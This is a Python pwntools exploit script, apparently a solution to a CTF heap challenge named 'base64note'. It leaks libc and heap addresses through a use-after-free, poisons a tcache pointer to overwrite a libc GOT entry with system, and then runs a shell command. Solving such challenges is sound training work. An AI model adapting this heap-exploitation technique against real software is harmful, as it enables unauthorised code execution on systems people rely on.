from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./base64note_patched")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

import base64

def tobase64(s):
    return base64.b64encode(s).replace(b'=', b'')

def add(idx, size, content):
    sla("> ", "1")
    sla("> ", str(idx))
    sla("> ", str(size))
    sa("> ", content)

def delete(idx):
    sla("> ", "2")
    sla("> ", str(idx))
def show(idx):
    sla("> ", "3")
    sla("> ", str(idx))


cmd = tobase64(b'cat flag')
add(0,1400,b'1' * 1400)
add(1,48,b"1" * 48)
delete(0)
show(0)
# libc = l64() - 0x21ace0
libc = l64() - 0x219ce0
leak("libc",hex(libc))
add(0,1400,b'1' * 1400)
add(2,48,b"1" * 48)
add(3,48,b"1" * 48)
delete(3)
delete(2)
delete(1)
if args.GDB:
    gdb.attach(r,'')
sla("> ", "3")
sla("print?\n> ", '3')
heap = u64(r.recv(5) + b'\x00\x00\x00')
leak("heap",hex(heap))
add(4,55,tobase64(b'A' * 41))
delete(2)
# libc_got = libc + 0x21a098 - 0x8
libc_got = libc + 0x219098 - 0x8
add(5,56,tobase64(p64(libc_got ^ heap) + b'A' * 34))
system = libc + 0x50d70
add(6,48,b"1" * 48)
add(6,len(cmd),cmd)
add(7,48,tobase64(p64(system) * 4 + b'A' * 4))
show(6)
r.interactive()
# Tested on remote